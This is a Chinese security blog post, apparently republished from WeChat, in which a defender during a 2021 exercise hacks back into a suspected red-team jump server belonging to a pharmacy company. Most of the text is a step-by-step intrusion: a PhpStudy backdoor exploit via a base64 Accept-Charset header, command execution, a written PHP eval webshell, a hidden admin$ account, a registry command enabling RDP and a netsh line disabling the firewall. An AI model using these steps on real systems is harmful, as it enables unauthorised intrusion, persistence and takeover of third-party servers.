# 实战|hw防守方溯源红队跳板

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzIwMzIyMjYzNA==&mid=2247500502&idx=1&sn=9480c38183bb48fb11d881393dc46ad4&chksm=96d039d3a1a7b0c563623b3202c8a6143f82dd748b1291dc2f32c83731fd72baa9ce946efafc&scene=126&sessionid=1681666908#rd](http://mp.weixin.qq.com/s?__biz=MzIwMzIyMjYzNA==&mid=2247500502&idx=1&sn=9480c38183bb48fb11d881393dc46ad4&chksm=96d039d3a1a7b0c563623b3202c8a6143f82dd748b1291dc2f32c83731fd72baa9ce946efafc&scene=126&sessionid=1681666908#rd)

在2021hw期间，通过监测设备发现一个攻击IP，其资产为某药房企业，疑似为红队跳板，经过溯源，最终确定为该IP为红队跳板，感觉本次溯源有不少收获，且很有意思，因此将溯源过程记录下来。

  

1.首先访问其官网，发现服务器返回信息显示其使用了PHP/5.4.45，想到如果是利用PhpStudy工具，可能存在后门漏洞

  

![](../Images/8a7208f1b577d4e71b2880ebddd70d69.png)

  

2.查看之前的博客《PhpStudy后门漏洞》，构造payload,将Accept-Charset字段修改为base64加密的命令“phpinfo();”

![](../Images/39b0528bc6db1ae2e8d8943db63821c0.png)

  

  

3.根据结果看出确实存在PhpStudy解析漏洞，根据路径猜测其为Windows操作系统，执行base64加密的命令“echo system("net user");”

  

![](../Images/40a43aa5b113e3ec2b578d1ab5257e2a.png)

  

4.探测网站根目录，执行base64加密的命令“echo system("dir");”

  

![](../Images/70b4b795911e517982514fee1695fa9b.png)

  

5.下载安装PhpStudy工具，发现网站根目录都为www目录，猜测目标根目录为“D:\\phpStudy\\WWW\\”，创建文件写入一句话木马，base64加密“$fp=fopen('D:\\phpStudy\\WWW\\index2.php',"w+");fputs($fp,'<?php eval($\_POST\[\\'index2\\'\]);?>');fclose($fp);”

  

![](../Images/8d62598436a811e7b1147a3eabd6d567.png)

  

  

6.用工具进行连接马文件

  

![](../Images/77bdd156bb8b08da327eb83c2e92214f.png)

  

7.探测开放端口信息，未开启3389端口

  

![](../Images/f91b4ee71315ec8b0d64bffe23a149ed.png)

  

8.创建隐藏用户admin$发现已经被创建，可通过修改密码，开启3389端口，远程登录

  

PS：动作太大，不推荐，创建新用户后，远程连接新账号返回“远程登录时出现windows不能让您远程登录，因为不能加载您的配置文件”，才使用这种方法

  

开启3389端口：

  

REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal" "Server /v fDenyTSConnections /t REG\_DWORD /d 00000000 /f

  

关闭防火墙（操作系统版本从PHPinfo截图可知为Windows Server 2003）：

  

netsh firewall set opmode mode=disable

  

![](../Images/2725d027661151fd65b357e8f77d2889.png)

  

9.远程连接，确定为红队攻击跳板

  

![](../Images/be2dc3616f80e60885b31d747f45f7d2.png)
